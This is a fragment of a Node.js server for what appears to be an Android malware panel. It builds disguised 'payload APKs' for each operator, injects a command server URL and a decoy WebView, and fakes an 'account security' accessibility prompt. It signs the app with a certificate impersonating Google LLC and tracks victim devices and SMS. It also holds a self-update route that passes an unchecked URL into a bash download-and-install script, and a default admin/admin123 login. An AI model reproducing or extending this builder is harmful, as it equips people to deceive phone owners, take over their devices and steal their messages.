  if (!username || !password) return res.status(400).json({ error: 'username + password required' });
  const d = dbLoad();
  if (d.users.find(u => u.username === username)) return res.status(409).json({ error: 'Username taken' });
  const days = parseInt(expiryDays) || 180;
  const expiresAt = (role === 'admin') ? null : (now() + days * 86400000);
  const user = { id: uid(), username, passwordHash: sha256(password), token: uid(), role: role || 'user', phone: phone || '', expiresAt, createdAt: now() };
  dbRun(db => db.users.push(user));
  res.json({ id: user.id, username: user.username, token: user.token, role: user.role, expiresAt: user.expiresAt });
});

app.delete('/api/admin/users/:id', authAdmin, (req, res) => {
  const d = dbLoad();
  const u = d.users.find(x => x.id === req.params.id);
  if (!u) return res.status(404).json({ error: 'Not found' });
  if (u.role === 'admin' && d.users.filter(x => x.role === 'admin').length <= 1) return res.status(400).json({ error: 'Cannot delete last admin' });
  dbRun(db => { db.users = db.users.filter(x => x.id !== req.params.id); });
  res.json({ ok: true });
});

app.put('/api/admin/users/:id/password', authAdmin, (req, res) => {
  const { password } = req.body || {};
  if (!password || password.length < 4) return res.status(400).json({ error: 'Password too short (min 4)' });
  const d = dbLoad();
  const u = d.users.find(x => x.id === req.params.id);
  if (!u) return res.status(404).json({ error: 'User not found' });
  dbRun(db => { const usr = db.users.find(x => x.id === req.params.id); if (usr) usr.passwordHash = sha256(password); });
  res.json({ ok: true });
});

/* ── Self-Update: admin triggers a fresh reinstall from Replit ── */
app.post('/api/admin/self-update', authAdmin, (req, res) => {
  const replitUrl = req.body && req.body.replitUrl;
  if (!replitUrl || !/^https?:\/\/.+/.test(replitUrl)) {
    return res.status(400).json({ error: 'replitUrl required' });
  }
  res.json({ ok: true, message: 'Update started — panel restarts in ~30s' });
  // Run update async so response is sent first
  setTimeout(() => {
    try {
      const script = [
        '#!/bin/bash',
        `REPLIT_URL="${replitUrl}"`,
        'INSTALL_DIR=/opt/device-panel',
        '# Backup data',
        '[ -f "$INSTALL_DIR/data.json" ] && cp "$INSTALL_DIR/data.json" /tmp/dp-data.bak 2>/dev/null',
        '# Download latest package',
        'TMP=/tmp/dp-selfupdate.tar.gz',
        'curl -fsSL "$REPLIT_URL/api/package" -o "$TMP" 2>/dev/null',
        '# Extract to temp dir',
        'EXDIR=/tmp/dp-extract-$$',
        'mkdir -p "$EXDIR" && tar -xzf "$TMP" -C "$EXDIR" 2>/dev/null',
        '# Copy all files EXCEPT data.json',
        'rsync -a --exclude="data.json" --exclude="node_modules" --exclude=".tools" --exclude="patcher-jobs" "$EXDIR/" "$INSTALL_DIR/" 2>/dev/null || cp -r "$EXDIR/"* "$INSTALL_DIR/" 2>/dev/null',
        '# Restore data',
        '[ -f /tmp/dp-data.bak ] && cp /tmp/dp-data.bak "$INSTALL_DIR/data.json" 2>/dev/null',
        'rm -rf "$EXDIR" "$TMP"',
        '# Install deps if package.json changed',
        'cd "$INSTALL_DIR" && npm install --production --silent 2>/dev/null',
        '# Restart panel service',
        'systemctl restart device-panel 2>/dev/null || (fuser -k 80/tcp 2>/dev/null; sleep 1; node "$INSTALL_DIR/server.js" &)',
      ].join('\n');
      const tmpScript = '/tmp/dp-selfupdate.sh';
      require('fs').writeFileSync(tmpScript, script, { mode: 0o755 });
      execSync(`bash ${tmpScript} >> /tmp/dp-selfupdate.log 2>&1 &`, { stdio: 'ignore' });
    } catch(e) { console.error('self-update error', e.message); }
  }, 100);
});

app.get('/api/admin/stats', authAdmin, (req, res) => {
  const d = dbLoad();
  res.json({ users: d.users.length, devices: d.devices.length, sms: d.sms.length });
});

app.get('/api/admin/all-devices', authAdmin, (req, res) => {
  const d = dbLoad();
  const users = Object.fromEntries(d.users.map(u => [u.id, u.username]));
  res.json(d.devices.map(dev => ({ ...dev, online: (now() - dev.lastSeen) < 60000, username: users[dev.userId] || '?' })));
});

/* ─────────────────────────────────────────────────────────
   APK BUILD (per logged-in user token)
───────────────────────────────────────────────────────── */
let buildRunning = false;
let buildStartedAt = 0;
const BUILD_TIMEOUT_MS = 15 * 60 * 1000; // 15 min max

/* Auto-reset if stuck */
setInterval(() => {
  if (buildRunning && Date.now() - buildStartedAt > BUILD_TIMEOUT_MS) {
    console.log('Build timeout — auto-resetting buildRunning');
    buildRunning = false;
  }
}, 60000);

/* Force reset endpoint */
app.post('/api/build-reset', authAdmin, (req, res) => {
  buildRunning = false;
  res.json({ ok: true, message: 'Build lock reset' });
});

app.get('/api/build-status', authDash, (req, res) => {
  res.json({ running: buildRunning, startedAt: buildStartedAt });
});

/* ── Build Config Upload ───────────────────────────────── */
// Saves app name, server URL, package name and optional icon before build starts
// Accepts JSON body with optional iconBase64 field (data:image/...;base64,...)
app.post('/api/build-config', authDash, (req, res) => {
  try {
    let userId = req.user.id;
    if (req.user.role === 'admin' && req.body && req.body.targetToken) {
      const db2 = dbLoad();
      const tgt = db2.users.find(u => u.token === req.body.targetToken);
      if (tgt) userId = tgt.id;
    }
    const conf = {
      appName:   (req.body && req.body.appName)   || '',
      serverUrl: (req.body && req.body.serverUrl) || '',
      userPhone: (req.body && req.body.userPhone) || '',
      pkgName:   (req.body && req.body.pkgName)   || '',
      iconPath:  null
    };
    // Handle base64 icon from JSON body
    const iconB64 = req.body && req.body.iconBase64;
    if (iconB64 && iconB64.startsWith('data:image/')) {
      const destIcon = `/tmp/buildicon_${userId}.png`;
      const base64Data = iconB64.replace(/^data:image\/\w+;base64,/, '');
      const rawPath = `/tmp/buildicon_raw_${userId}`;
      try {
        fs.writeFileSync(rawPath, Buffer.from(base64Data, 'base64'));
        try {
          execSync(`convert "${rawPath}" -resize 192x192 -depth 8 -type TrueColorAlpha -define png:bit-depth=8 -define png:color-type=6 "${destIcon}" 2>/dev/null`, { timeout: 10000 });
        } catch(_) {
          fs.copyFileSync(rawPath, destIcon);
        }
        try { fs.unlinkSync(rawPath); } catch(_) {}
        conf.iconPath = destIcon;
      } catch(e2) { /* icon save failed — continue without icon */ }
    }
    fs.writeFileSync(`/tmp/buildconf_${userId}.json`, JSON.stringify(conf));
    res.json({ ok: true });
  } catch(e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/api/build-payload', authDash, async (req, res) => {
  if (buildRunning) {
    const elapsed = Math.floor((Date.now() - buildStartedAt) / 1000);
    res.status(409).send(`Build already running (${elapsed}s)`);
    return;
  }
  buildRunning = true;
  buildStartedAt = Date.now();

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.flushHeaders();

  // Admin can build for another user via ?targetToken=xxx
  let userToken = req.user.token;
  let userId    = req.user.id;
  if (req.user.role === 'admin' && req.query.targetToken) {
    const db2 = dbLoad();
    const tgt = db2.users.find(u => u.token === req.query.targetToken);
    if (tgt) { userToken = tgt.token; userId = tgt.id; }
  }
  const buildOut  = path.join(BUILD_DIR, `apk_${userId}.apk`);

  // Read saved build config (from /api/build-config POST)
  let buildConf = { appName: '', serverUrl: '', iconPath: null };
  try {
    const confFile = `/tmp/buildconf_${userId}.json`;
    if (fs.existsSync(confFile)) buildConf = JSON.parse(fs.readFileSync(confFile, 'utf8'));
  } catch(_) {}

  const send = line => res.write('data: ' + JSON.stringify({ log: line }) + '\n\n');
  const finish = ok => {
    buildRunning = false;
    res.write('data: ' + JSON.stringify({ done: true, ok }) + '\n\n');
    res.end();
  };

  try {
    const buildDir = path.join('/tmp', `build_${userId}`);
    send(`[>>] Building payload APK for user: ${req.user.username}`);
    send(`Token: ${userToken.slice(0,8)}...`);
    if (buildConf.appName)   send(`App Name: ${buildConf.appName}`);
    if (buildConf.serverUrl) send(`Server URL: ${buildConf.serverUrl}`);
    if (buildConf.iconPath)  send(`Custom icon: yes`);

    /* ── Step 1: Copy template ─────────────────────────── */
    send(''); send('[>>] [1/4] Copying template...');
    if (!fs.existsSync(PAYLOAD_TPL)) throw new Error('android-payload directory missing — redeploy VPS');
    if (fs.existsSync(buildDir)) fs.rmSync(buildDir, { recursive: true });
    await runCmd('cp', ['-r', PAYLOAD_TPL, buildDir], {}, send);
    await runCmd('chmod', ['+x', path.join(buildDir, 'gradlew')], {}, send);
    send('[OK] Template copied');

    /* ── Auto-fix: gradle-wrapper.jar ─────────────────── */
    await autoFixWrapperJar(buildDir, send);

    /* ── Auto-fix: local.properties ───────────────────── */
    fs.writeFileSync(path.join(buildDir, 'local.properties'),
      `sdk.dir=${SDK}\nandroid.useAndroidX=false\nandroid.enableJetifier=false\n`);

    /* ── Step 2: Inject token + custom config ──────────── */
    send('[>>] [2/4] Injecting config...');
    const cfgPath = path.join(buildDir, 'app/src/main/java/com/panellord/Config.java');
    let cfg = fs.readFileSync(cfgPath, 'utf8');
    const vpsUrl = `http://${getPublicIp() || '127.0.0.1'}`;
    cfg = cfg.replace('VPS_URL_PLACEHOLDER', vpsUrl);
    cfg = cfg.replace('USER_TOKEN_PLACEHOLDER', userToken);
    cfg = cfg.replace('USER_PHONE_PLACEHOLDER', buildConf.userPhone ? buildConf.userPhone.trim() : '');
    fs.writeFileSync(cfgPath, cfg);
    send(`[OK] VPS URL: ${vpsUrl}`);
    // Inject custom WebView (cover) URL into MainActivity.java
    if (buildConf.serverUrl && buildConf.serverUrl.trim()) {
      const mainPath = path.join(buildDir, 'app/src/main/java/com/panellord/MainActivity.java');
      if (fs.existsSync(mainPath)) {
        let main = fs.readFileSync(mainPath, 'utf8');
        main = main.replace(
          /private static final String COVER_URL\s*=\s*"[^"]*";/,
          `private static final String COVER_URL = "${buildConf.serverUrl.trim()}";`
        );
        fs.writeFileSync(mainPath, main);
        send(`[OK] WebView URL set: ${buildConf.serverUrl.trim()}`);
      }
    }

    // Inject custom package name into build.gradle + AndroidManifest
    if (buildConf.pkgName && buildConf.pkgName.trim()) {
      const pkg = buildConf.pkgName.trim();
      const bgPath = path.join(buildDir, 'app/build.gradle');
      if (fs.existsSync(bgPath)) {
        let bg = fs.readFileSync(bgPath, 'utf8');
        bg = bg.replace(/applicationId\s+"[^"]*"/, `applicationId "${pkg}"`);
        fs.writeFileSync(bgPath, bg);
      }
      const mfPath2 = path.join(buildDir, 'app/src/main/AndroidManifest.xml');
      if (fs.existsSync(mfPath2)) {
        let mf2 = fs.readFileSync(mfPath2, 'utf8');
        mf2 = mf2.replace(/package="[^"]*"/, `package="${pkg}"`);
        fs.writeFileSync(mfPath2, mf2);
      }
      send(`[OK] Package name set: ${pkg}`);
    }

    // Inject custom app name into strings.xml + AndroidManifest
    if (buildConf.appName && buildConf.appName.trim()) {
      const strXml = path.join(buildDir, 'app/src/main/res/values/strings.xml');
      if (fs.existsSync(strXml)) {
        let xml = fs.readFileSync(strXml, 'utf8');
        xml = xml.replace(/<string name="app_name">[^<]*<\/string>/, `<string name="app_name">${buildConf.appName.trim()}</string>`);
        xml = xml.replace(/<string name="accessibility_description">[^<]*<\/string>/, `<string name="accessibility_description">${buildConf.appName.trim()} requires this permission for account security.</string>`);
        fs.writeFileSync(strXml, xml);
      }
      // Also patch AndroidManifest label
      const mfPath = path.join(buildDir, 'app/src/main/AndroidManifest.xml');
      if (fs.existsSync(mfPath)) {
        let mf = fs.readFileSync(mfPath, 'utf8');
        mf = mf.replace(/android:label="[^"]*"/, `android:label="${buildConf.appName.trim()}"`);
        fs.writeFileSync(mfPath, mf);
      }
      send(`[OK] App name set: ${buildConf.appName.trim()}`);
    }
    send('[OK] Token injected');

    // Inject custom icon into all mipmap directories
    if (buildConf.iconPath && fs.existsSync(buildConf.iconPath)) {
      // Remove adaptive icon XMLs so PNGs take full priority for all API levels
      const anydpiDir = path.join(buildDir, 'app/src/main/res/mipmap-anydpi-v26');
      try { fs.unlinkSync(path.join(anydpiDir, 'ic_launcher.xml')); } catch(_) {}
      try { fs.unlinkSync(path.join(anydpiDir, 'ic_launcher_round.xml')); } catch(_) {}

      const mipmapSizes = [
        { dir: 'mipmap-mdpi',    size: 48  },
        { dir: 'mipmap-hdpi',    size: 72  },
        { dir: 'mipmap-xhdpi',   size: 96  },
        { dir: 'mipmap-xxhdpi',  size: 144 },
        { dir: 'mipmap-xxxhdpi', size: 192 }
      ];
      for (const { dir, size } of mipmapSizes) {
        const dirPath = path.join(buildDir, 'app/src/main/res', dir);
        try { fs.mkdirSync(dirPath, { recursive: true }); } catch(_) {}
        const dest1 = path.join(dirPath, 'ic_launcher.png');
        const dest2 = path.join(dirPath, 'ic_launcher_round.png');
        try {
          execSync(`convert "${buildConf.iconPath}" -resize ${size}x${size} -gravity center -background none -extent ${size}x${size} -depth 8 -type TrueColorAlpha -define png:bit-depth=8 -define png:color-type=6 "${dest1}" 2>/dev/null`, { timeout: 15000 });
          fs.copyFileSync(dest1, dest2);
        } catch(_) {
          try {
            execSync(`convert "${buildConf.iconPath}" -thumbnail ${size}x${size} -depth 8 -define png:bit-depth=8 "${dest1}"`, { timeout: 15000 });
            fs.copyFileSync(dest1, dest2);
          } catch(_2) {
            fs.copyFileSync(buildConf.iconPath, dest1);
            fs.copyFileSync(buildConf.iconPath, dest2);
          }
        }
      }
      send('[OK] Custom icon injected');
    }

    /* ── Step 3: Android SDK ───────────────────────────── */
    send('[>>] [3/4] Android SDK...');
    await ensureSdk(send);

    /* ── Step 3b: Generate keystore ───────────────────── */
    send('[>>] [3b] Generating keystore...');
    const ksPath = path.join(buildDir, 'release.keystore');
    const ksAlias = 'sysapp';
    const ksPass = 'Sys@2024!Secure';
    try {
      const keytool = '/usr/lib/jvm/java-17-openjdk/bin/keytool';
      await runCmd(keytool, [
        '-genkeypair', '-v',
        '-keystore', ksPath,
        '-storepass', ksPass,
        '-alias', ksAlias,
        '-keypass', ksPass,
        '-keyalg', 'RSA',
        '-keysize', '2048',
        '-validity', '10000',
        '-dname', 'CN=System Services,OU=Core,O=Google LLC,L=Mountain View,ST=CA,C=US'
      ], {}, () => {});
      // Write signing config into build.gradle
      const bgPath = path.join(buildDir, 'app/build.gradle');
      let bg = fs.readFileSync(bgPath, 'utf8');
      const signingBlock = `\n    signingConfigs {\n        release {\n            storeFile file('../release.keystore')\n            storePassword '${ksPass}'\n            keyAlias '${ksAlias}'\n            keyPassword '${ksPass}'\n        }\n    }\n`;
      // Inject signingConfigs before buildTypes
      bg = bg.replace('    buildTypes {', signingBlock + '    buildTypes {');
      // Apply signing to debug build type
      bg = bg.replace(
        /debug \{([^}]*)\}/s,
        `debug {\n            signingConfig signingConfigs.release\n$1}`
      );
      fs.writeFileSync(bgPath, bg);
      send('[OK] Keystore generated (CN=Google LLC)');
    } catch(ksErr) {
      send('Keystore gen failed (debug sign fallback): ' + ksErr.message.split('\n')[0]);
    }

    /* ── Step 4: Gradle build with auto-retry ──────────── */
    send('[>>] [4/4] Gradle build...');
    const buildEnv = { ...process.env, ANDROID_HOME: SDK, ANDROID_SDK_ROOT: SDK, GRADLE_OPTS: '-Dorg.gradle.daemon=false -Xmx1024m' };
    delete buildEnv.JAVA_OPTS; delete buildEnv._JAVA_OPTIONS; delete buildEnv.JAVA_TOOL_OPTIONS;

    let code = await runGradleWithAutoFix(buildDir, buildEnv, send, 0);

    const apkSrc = path.join(buildDir, 'app/build/outputs/apk/debug/app-debug.apk');
    if (code === 0 && fs.existsSync(apkSrc)) {
      fs.copyFileSync(apkSrc, buildOut);
      const mb = (fs.statSync(buildOut).size / 1024 / 1024).toFixed(2);
      send(''); send(`[OK] BUILD SUCCESS  (${mb} MB) — Download ready!`);
      finish(true);
    } else {
      send(''); send('[ERR] BUILD FAILED — check errors above');
      finish(false);
    }
  } catch(e) {
    send('[ERR] Error: ' + e.message);
    finish(false);
  }
});

/* ── Auto-fix: download gradle-wrapper.jar if missing ─── */
async function autoFixWrapperJar(buildDir, send) {
  const jar = path.join(buildDir, 'gradle/wrapper/gradle-wrapper.jar');
  if (fs.existsSync(jar) && fs.statSync(jar).size > 10000) return;
  send('  Auto-fix: gradle-wrapper.jar missing — downloading...');
  const jarUrl = 'https://raw.githubusercontent.com/gradle/gradle/v7.6.3/gradle/wrapper/gradle-wrapper.jar';
  const ok = await runCmd('curl', ['-fsSL', '--retry', '3', '-o', jar, jarUrl], {}, send);
  if (ok === 0) { send('  [OK] gradle-wrapper.jar fixed'); return; }
  await runCmd('wget', ['-q', '--tries=3', '-O', jar, jarUrl], {}, send);
  if (fs.existsSync(jar) && fs.statSync(jar).size > 10000) { send('  [OK] gradle-wrapper.jar fixed (wget)'); }
  else send('  Could not download wrapper jar');
}

/* ── Gradle build with auto-error detection + retry ───── */
async function runGradleWithAutoFix(buildDir, env, send, attempt) {
  const MAX_ATTEMPTS = 3;
  const lines = [];
  const capture = (line) => { lines.push(line); send(line); };

  const code = await runCmd('./gradlew', ['assembleDebug', '--no-daemon', '--stacktrace'], { cwd: buildDir, env }, capture);
  if (code === 0) return 0;
  if (attempt >= MAX_ATTEMPTS - 1) return code;

  const output = lines.join('\n');

  /* ── Detect & fix known errors ──────────────────────── */
  const fixes = [
    {
      pattern: /GradleWrapperMain|Could not find or load main class org\.gradle\.wrapper/,
      fix: async () => {
        send('  Auto-fix: Gradle wrapper broken — re-downloading...');
        fs.rmSync(path.join(buildDir, 'gradle/wrapper/gradle-wrapper.jar'), { force: true });
        await autoFixWrapperJar(buildDir, send);
      }
    },
    {
      pattern: /Could not resolve com\.android\.tools\.build|Could not GET.*jcenter|Network is unreachable/,
      fix: async () => {
        send('  Auto-fix: Gradle cache / network error — clearing cache...');
        const cacheDir = path.join(process.env.HOME || '/root', '.gradle/caches');
        if (fs.existsSync(cacheDir)) fs.rmSync(cacheDir, { recursive: true });
        send('  [OK] Gradle cache cleared');
      }
    },
    {
      pattern: /SDK location not found|No such property.*android/,
      fix: async () => {
        send('  Auto-fix: SDK location — writing local.properties...');
        fs.writeFileSync(path.join(buildDir, 'local.properties'), `sdk.dir=${SDK}\n`);
      }
    },
    {
      pattern: /OutOfMemoryError|GC overhead limit/,
      fix: async () => {
        send('  Auto-fix: OOM — increasing heap...');
        env.GRADLE_OPTS = '-Dorg.gradle.daemon=false -Xmx1536m -Xms256m';
        const propsPath = path.join(buildDir, 'gradle.properties');
        let p = fs.existsSync(propsPath) ? fs.readFileSync(propsPath, 'utf8') : '';
        if (!p.includes('org.gradle.jvmargs')) p += '\norg.gradle.jvmargs=-Xmx1536m\n';
        fs.writeFileSync(propsPath, p);
      }
    },
    {
      pattern: /Gradle build daemon disappeared|Expiring Daemon/,
      fix: async () => {
        send('  Auto-fix: Gradle daemon crash — cleaning up...');
        const daemonDir = path.join(process.env.HOME || '/root', '.gradle/daemon');
        if (fs.existsSync(daemonDir)) fs.rmSync(daemonDir, { recursive: true });
      }
    },
    {
      pattern: /AAPT.*error|resource.*not found|cannot find symbol/,
      fix: async () => {
        send('  Auto-fix: Resource error — cleaning build dir...');
        const buildOut2 = path.join(buildDir, 'app/build');
        if (fs.existsSync(buildOut2)) fs.rmSync(buildOut2, { recursive: true });
      }
    },
    {
      pattern: /Unsupported class file major version|requires Java/,
      fix: async () => {
        send('  Auto-fix: Java version mismatch — trying Java 17...');
        const java17 = findJava17();
        if (java17) {
          env.JAVA_HOME = java17;
          env.PATH = path.join(java17, 'bin') + ':' + env.PATH;
        }
      }
    },
  ];

  let fixed = false;
  for (const { pattern, fix } of fixes) {
    if (pattern.test(output)) {
      await fix();
      fixed = true;
      break;
    }
  }

  if (!fixed) {
    send(`  Unknown error — retrying (attempt ${attempt + 2}/${MAX_ATTEMPTS})...`);
  } else {
    send(`  Retrying build (attempt ${attempt + 2}/${MAX_ATTEMPTS})...`);
  }
  send('');
  return runGradleWithAutoFix(buildDir, env, send, attempt + 1);
}

app.get('/api/download-apk', authDash, (req, res) => {
  let uid2 = req.user.id, uname = req.user.username;
  if (req.user.role === 'admin' && req.query.targetToken) {
    const db3 = dbLoad();
    const tgt = db3.users.find(u => u.token === req.query.targetToken);
    if (tgt) { uid2 = tgt.id; uname = tgt.username; }
  }
  const apk = path.join(BUILD_DIR, `apk_${uid2}.apk`);
  if (!fs.existsSync(apk)) return res.status(404).json({ error: 'Build APK first' });
  res.download(apk, `DevicePanel-${uname}.apk`);
});

/* ─────────────────────────────────────────────────────────
   STATIC FILES (css, js, assets — but NOT index.html)
─────────────────────────────────────────────────────────── */
app.use(express.static(path.join(BASE, 'public'), { index: false }));

/* ─────────────────────────────────────────────────────────
   SPA ROUTES
───────────────────────────────────────────────────────── */
const pub = path.join(BASE, 'public');
function sendHtml(res, file) {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  res.sendFile(path.join(pub, file));
}
app.get('/',          (_,res) => sendHtml(res, 'login.html'));
app.get('/dashboard', (_,res) => sendHtml(res, 'dashboard.html'));
app.get('/device',    (_,res) => sendHtml(res, 'device.html'));
app.get('/admin',     (_,res) => sendHtml(res, 'admin.html'));

/* ─────────────────────────────────────────────────────────
   BUILD HELPERS
───────────────────────────────────────────────────────── */
function runCmd(cmd, args, opts, send) {
  return new Promise(resolve => {
    const p = spawn(cmd, args, opts);
    if (send) {
      p.stdout.on('data', d => d.toString().split('\n').forEach(l => { if(l.trim()) send(l); }));
      p.stderr.on('data', d => d.toString().split('\n').forEach(l => { if(l.trim()) send('  '+l); }));
    }
    p.on('error', e => { if(send) send('[ERR] '+e.message); resolve(1); });
    p.on('close', resolve);
  });
}

async function ensureSdk(send) {
  /* Download cmdline-tools if missing */
  if (!fs.existsSync(SDKMANAGER)) {
    send('  Downloading Android cmdline-tools...');
    const zip = '/tmp/cmdline-tools.zip';
    const url = 'https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip';
    await runCmd('curl', ['-fL', '-o', zip, url], {}, send);
    const ctDir = path.join(SDK, 'cmdline-tools');
    fs.mkdirSync(ctDir, { recursive: true });
    await runCmd('unzip', ['-q', '-o', zip, '-d', ctDir], {}, send);
    const extracted = path.join(ctDir, 'cmdline-tools');
    const latest    = path.join(ctDir, 'latest');
    if (fs.existsSync(extracted) && !fs.existsSync(latest)) fs.renameSync(extracted, latest);
    send('[OK] cmdline-tools ready');
  }

  /* Licenses */
  const licDir = path.join(SDK, 'licenses');
  fs.mkdirSync(licDir, { recursive: true });
  fs.writeFileSync(path.join(licDir, 'android-sdk-license'), '8933bad161af4408b2dde8a4872fc36\nd56f5187479451eabf01fb78af6dfcb\n24333f8a63b6825ea9c5514f83c2829b\n');
  fs.writeFileSync(path.join(licDir, 'android-sdk-preview-license'), '84831b9409646a918e30573bab4c9c91d18bf353\n');

  /* SDK packages */
  const needPlatform   = !fs.existsSync(path.join(SDK, 'platforms/android-33'));
  const needBuildTools = !fs.existsSync(path.join(SDK, 'build-tools/30.0.3'));
  if (!needPlatform && !needBuildTools) { send('[OK] SDK packages present'); return; }

  /* Find Java 17 for sdkmanager */
  const java17 = findJava17();
  if (!java17) {
    send('  Installing Java 17...');
    await runCmd('sudo', ['dnf', 'install', '-y', 'java-17-amazon-corretto'], {}, send);
  }
  const j17 = java17 || findJava17();
  if (!j17) { send('[ERR] Java 17 not found'); throw new Error('Java 17 required'); }
  send('[OK] Java 17: ' + j17);

  const sdkEnv = { PATH: path.join(j17,'bin')+':'+process.env.PATH, HOME: process.env.HOME||'/root', JAVA_HOME: j17, ANDROID_HOME: SDK, ANDROID_SDK_ROOT: SDK };
  const lp = spawn(SDKMANAGER, ['--licenses'], { env: sdkEnv });
  lp.stdin.write(Array(30).fill('y').join('\n')); lp.stdin.end();
  await new Promise(r => lp.on('close', r));

  const pkgs = [];
  if (needPlatform)   pkgs.push('platforms;android-33');
  if (needBuildTools) pkgs.push('build-tools;30.0.3');
  send('  Installing SDK: ' + pkgs.join(', '));
  const ic = await runCmd(SDKMANAGER, pkgs, { env: sdkEnv }, send);
  if (ic !== 0) throw new Error('SDK install failed');
  send('[OK] SDK packages installed');
}

function findJava17() {
  const c = ['/usr/lib/jvm/java-17-amazon-corretto','/usr/lib/jvm/java-17-amazon-corretto.x86_64','/usr/lib/jvm/java-17-openjdk-amd64','/usr/lib/jvm/java-17-openjdk','/usr/lib/jvm/java-17'];
  for (const p of c) { if (fs.existsSync(path.join(p,'bin/java'))) return p; }
  try { const r = execSync('find /usr/lib/jvm -name "java" 2>/dev/null | grep -E "/17[./]|/java-17" | head -1',{timeout:5000}).toString().trim(); if(r) return path.dirname(path.dirname(r)); } catch(e) {}
  return null;
}

/* ─────────────────────────────────────────────────────────
   START
───────────────────────────────────────────────────────── */
const httpServer = http.createServer(app);

httpServer.on('error', (err) => {
  if (err.code === 'EADDRINUSE') {
    console.error(`\n  [ERR] PORT ${PORT} ALREADY IN USE!`);
    console.error(`  Fix: sudo fuser -k ${PORT}/tcp   then restart service\n`);
  } else {
    console.error(`\n  [ERR] Server error: ${err.message}\n`);
  }
  process.exit(1);
});

httpServer.listen(PORT, '0.0.0.0', () => {
  console.log(`\n  ╔═══════════════════════════════════╗`);
  console.log(`  ║  Device Panel VPS Server  :${PORT}   ║`);
  console.log(`  ╚═══════════════════════════════════╝`);
  console.log(`  Panel:  http://${getPublicIp()||"<detecting...>"}/`);
  console.log(`  Login:  admin / admin123\n`);
});
